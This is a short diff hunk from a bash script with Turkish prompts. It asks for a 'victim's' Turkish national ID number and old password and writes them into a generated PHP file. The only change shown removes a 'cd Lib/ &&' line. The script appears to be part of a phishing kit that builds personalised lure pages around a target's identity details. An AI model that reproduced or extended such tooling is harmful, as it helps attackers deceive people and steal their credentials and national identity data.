@@ -40,7 +40,7 @@ start(){
 	read -p $'\e[31m[\e[32m!\e[31m]\e[37mKurbanın Tc Kimlik Nosu : ' tcno
 	read -p $'\e[31m[\e[32m!\e[31m]\e[37mEski Şifresi : ' eskisifrei
 
-	cd Lib/ &&
+	
 	echo "
 	<?php
 	\$ad = '$adi';
